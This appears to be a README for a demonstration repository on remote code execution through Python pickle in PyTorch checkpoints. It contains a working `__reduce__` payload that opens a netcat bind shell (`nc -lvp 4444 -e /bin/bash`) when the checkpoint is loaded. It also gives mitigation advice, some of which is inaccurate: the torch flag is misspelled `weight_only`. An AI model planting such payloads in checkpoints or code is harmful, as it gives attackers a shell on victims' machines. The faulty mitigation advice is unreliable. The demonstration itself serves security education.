# Pickle Remote Code Execution (RCE) Vulnerability

This repository demonstrates a security vulnerability in Python's `pickle` module that can lead to remote code execution (RCE). The `pickle` module is used for serializing and deserializing Python objects, but it can execute arbitrary code during deserialization, making it dangerous to use with untrusted data.

## Repository Structure

- `gen_clean_ckpt.py`: Script to generate a clean checkpoint.
- `gen_payload_ckpy.py`: Script to generate a payload checkpoint.
- `payload_example.py`: Example script demonstrating the pickle RCE vulnerability.
- `README.md`: This file.

## Setup

```bash
pip install torch
python gen_clean_ckpt.py
python gen_payload_ckpy.py model_checkpoint.pth
```

Now victim loads the checkpoint using `torch.load`:

```python
torch.load('malicious_checkpoint.pth')
```

Attcker can now connect to the victim's machine using netcat:

```bash
nc localhost 4444 # replace localhost with the victim's IP
```

## Understanding the Vulnerability

The `payload_example.py` script demonstrates how an attacker can exploit the pickle RCE vulnerability. Here's a breakdown of the script:

The attack works by the unpickling or deserializing of python object classes.

As certain class objects might not be easy to serialize and stored by pickle,
such as file objects, sockets, etc. The `__reduce__` method is used to define
how the object should be constructed while unpickling/deserializing.

i.e. arbitrary code execution can be achieved by defining a class with a `__reduce__` method that executes the desired code.

```python
import pickle
import os

class MaliciousPickle:
    def __reduce__(self):
        return (os.system, ('nc -lvp 4444 -e /bin/bash',))

payload = pickle.dumps(MaliciousPickle())
pickle.loads(payload) # This will execute the payload and the attacker gains control
```

## Mitigations

***Never unpickle untrusted data***. The `pickle` module is not secure against erroneous or maliciously constructed data. It is recommended to use safer alternatives like JSON, XML, or YAML for data serialization and deserialization.

### ML specific mitigations

Always use `torch.load` with the `weight_only=True` flag to load model weights only. This ensures that the model architecture is not loaded from the checkpoint, preventing the execution of arbitrary code.

Or just set the environment variable `TORCH_LOAD_DISABLE_PICKLE` to `1` to disable the use of unsafe pickle in `torch.load`.

Lastly, just switch to using **safetensor** for model checkpoints.

An instance of the vulnerability which documents how untrusted pickle data can lead to remote code execution (RCE). For more details, refer to the official CVE entry:
[CVE-2024-3568](https://nvd.nist.gov/vuln/detail/CVE-2024-3568)
